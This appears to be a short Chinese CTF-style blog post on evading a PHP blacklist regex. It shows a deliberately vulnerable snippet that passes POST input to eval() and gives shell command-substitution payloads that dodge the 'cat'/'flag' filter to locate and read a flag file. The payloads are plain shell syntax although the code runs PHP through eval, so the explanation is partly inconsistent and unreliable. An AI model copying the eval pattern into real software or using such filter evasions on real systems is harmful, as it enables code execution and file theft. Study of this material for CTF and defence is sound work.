---
title: 'PHP 正则表达式的绕过'
date: '2025-04-23T19:58:08+08:00'
weight: 
draft: false
description: 'PHP 正则表达式的绕过'
---

### 示例一

```php
$cmd = $_POST['cmd'];
if (preg_match("/cat|flag/i", $cmd)) {
    die("u can not do this ");
}
echo eval($cmd);
```

**代码审计：**
- 从 HTTP 请求的 POST 方法获取数据，并将名为 `cmd` 的字段的值赋给变量 `$cmd`
- 使用正则表达式匹配 `$cmd` 中的 `cat` 和 `flag`，修饰符 `i`（case-insensitive）表示不区分大小写
- 如果匹配成功就终止脚本执行，并输出消息 `"u can not do this "`
- 如果匹配失败就使用 `eval($cmd)` 执行 PHP 代码，并输出执行结果

**需求：**
1. 查找 `flag` 文件位置：`find / -iname flag`
2. 查看 `falg` 文件内容：`cat /flag`

**解决方法：** `$(command)` 命令替换

`$(...)` 是 Shell 中命令替换的语法，它允许在一个命令中执行另一个命令，并将该命令的输出作为结果返回嵌入到其他命令中

```shell
find / -iname fla$(echo g)
ca$(echo t) /fla$(echo g)
```